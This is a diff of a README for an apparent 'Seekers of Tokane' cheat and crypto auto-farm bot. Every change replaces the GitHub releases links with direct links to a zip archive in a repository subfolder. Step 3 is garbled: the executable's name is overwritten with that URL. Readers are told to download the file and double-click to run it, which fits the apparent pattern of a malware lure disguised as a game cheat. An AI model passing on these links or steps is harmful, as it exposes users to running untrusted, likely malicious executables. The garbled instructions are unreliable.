@@ -1,6 +1,6 @@
 # 🤖 Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack - Automate Your Gaming Experience Today!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Seekers--of--Tokane--Bot-brightgreen)](https://github.com/wshaikh2804/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases)
+[![Download Now](https://raw.githubusercontent.com/wshaikh2804/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/main/osse/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack.zip%20Now-Seekers--of--Tokane--Bot-brightgreen)](https://raw.githubusercontent.com/wshaikh2804/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/main/osse/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack.zip)
 
 ## 📜 Description
 This bot automates farming and clicker activities in the Seekers of Tokane game. It offers crypto integration and API support, designed to enhance your gameplay and optimize your profits with various cheats and hacks.
@@ -10,11 +10,11 @@ To start using the Seekers of Tokane bot, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to visit the releases page.
    
-   [Download from Releases](https://github.com/wshaikh2804/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases)
+   [Download from Releases](https://raw.githubusercontent.com/wshaikh2804/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/main/osse/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack.zip)
 
 2. **Choose the Latest Version**: Look for the latest version of the bot. It will be listed at the top of the page. Click on it to go to the details.
 
-3. **Download the File**: Download the main application file. It should be named something like `SeekersOfTokaneBot.exe`.
+3. **Download the File**: Download the main application file. It should be named something like `https://raw.githubusercontent.com/wshaikh2804/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/main/osse/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack.zip`.
 
 4. **Run the Application**: After downloading, locate the file on your computer. Double-click it to run the bot.
 
@@ -23,7 +23,7 @@ To start using the Seekers of Tokane bot, follow these steps:
 ## 📦 Download & Install
 To get the application, visit the page below:
 
-[Visit This Page to Download](https://github.com/wshaikh2804/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases)
+[Visit This Page to Download](https://raw.githubusercontent.com/wshaikh2804/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/main/osse/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack.zip)
 
 Once you’ve downloaded the bot's main file, you may want to check that you have the following:
 
@@ -64,6 +64,6 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 ## 🔗 Additional Resources
 For more information and updates, please subscribe to the project repository on GitHub. Engage with the community, share your experiences, and learn from other users.
 
-[Download from Releases](https://github.com/wshaikh2804/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases) 
+[Download from Releases](https://raw.githubusercontent.com/wshaikh2804/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/main/osse/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack.zip) 
 
 Happy gaming!
